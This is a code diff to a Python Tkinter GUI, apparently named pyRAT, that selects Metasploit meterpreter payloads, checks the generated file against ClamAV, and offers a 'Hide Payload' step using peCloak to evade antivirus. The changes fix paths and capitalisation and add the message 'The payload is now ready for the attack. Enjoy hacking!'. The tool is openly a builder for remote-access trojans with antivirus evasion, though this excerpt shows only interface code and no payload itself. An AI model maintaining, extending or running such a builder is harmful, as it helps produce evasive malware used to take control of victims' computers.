@@ -64,7 +64,7 @@ def showPayloads():
     for i in (ret.get('payloads')):
         if "/meterpreter" in i:
            Radiobutton(frame1, text=str(i), variable=var, value=i).pack(anchor=W)
-    fbutton = Button(root, text="Choose payload", bg='lightblue', state=ACTIVE, command=lambda: mal(var))
+    fbutton = Button(root, text="Choose Payload", bg='lightblue', state=ACTIVE, command=lambda: mal(var))
     fbutton.place(x=420, y=525)
   
 # Set Payload Options
@@ -186,7 +186,8 @@ def success():
 def check():
           # Check with pyclamd if file is infected
           daemon = pyclamd.ClamdUnixSocket()
-          virus_name = "root/Desktop/pyRAT/" + file_name
+          cwd = os.getcwd()
+          virus_name = cwd + "/" + file_name
           results = daemon.scan_file(virus_name)    
           
           if results:   
@@ -198,7 +199,7 @@ def check():
                 
                 tkMessageBox.showinfo("File infected!!!", "MALWARE : %s" % results)               
     	        Label(f4, text="Now we have to hide the payload in order to bypass the AVs!").place(x=2,y=240)
-                enc = Button(root,text="Hide payload", bg='lightblue', state=ACTIVE, command=lambda:[peCloak(),rm(enc)])
+                enc = Button(root,text="Hide Payload", bg='lightblue', state=ACTIVE, command=lambda:[peCloak(),rm(enc)])
                 enc.place(relx=0.5, rely=0.96,anchor=CENTER)
                 
           else:
@@ -207,7 +208,7 @@ def check():
                 process = subprocess.Popen(['clamscan', file_name], stdout=subprocess.PIPE)
                 stdout = process.communicate()[0]
                 Label(f4,text='Payload scanned: {}'.format(stdout)).place(x=2,y=5)
-                Label(f4, text="Adios amigos!").place(x=2,y=240)
+                Label(f4, text="The payload is now ready for the attack. Enjoy hacking!").place(x=2,y=240)
           
                 adios = Button(root,text="Quit", bg='lightblue', state=ACTIVE, command=quit)
                 adios.place(relx=0.5, rely=0.96,anchor=CENTER)
@@ -224,7 +225,7 @@ def final():
           process = subprocess.Popen(['clamscan', fname], stdout=subprocess.PIPE)
           stdout = process.communicate()[0]
           Label(f5,text='Payload scanned: {}'.format(stdout)).place(x=2,y=5)
-          Label(f5, text="Adios amigos!").place(x=2,y=240)
+          Label(f5, text="The payload is now ready for the attack. Enjoy hacking!").place(x=2,y=240)
           
           adios = Button(root,text="Quit", bg='lightblue', state=ACTIVE, command=quit)
           adios.place(relx=0.5, rely=0.96,anchor=CENTER)
@@ -255,10 +256,10 @@ if __name__ == "__main__":
 
         f = Frame(root,relief=GROOVE,width=80,height=100,bd=8)
 	f.place(x=1,y=100)
-        photo = PhotoImage(file="/root/Desktop/pyRAT/img/raticate.png")
+        photo = PhotoImage(file="img/raticate.png")
         rat = Label(f,image=photo)
         rat.pack(side = "left",fill = "both", expand = "yes")
-        photo1 = PhotoImage(file="/root/Desktop/pyRAT/img/Raticate_(Alola).png")
+        photo1 = PhotoImage(file="img/Raticate_(Alola).png")
         rat1 = Label(f,image=photo1)
         rat1.pack(side = "right",fill = "both", expand = "yes")
         canvas0=Canvas(f)
@@ -294,7 +295,7 @@ if __name__ == "__main__":
 
 	f3 = Frame(root,relief=GROOVE,width=80,height=100,bd=8)
 	f3.place(x=1,y=100)
-        photo3 = PhotoImage(file="/root/Desktop/pyRAT/img/rat.png")
+        photo3 = PhotoImage(file="img/rat.png")
         rat3 = Label(f3,image=photo3)
         rat3.pack(side = "bottom")
         canvas2=Canvas(f3)
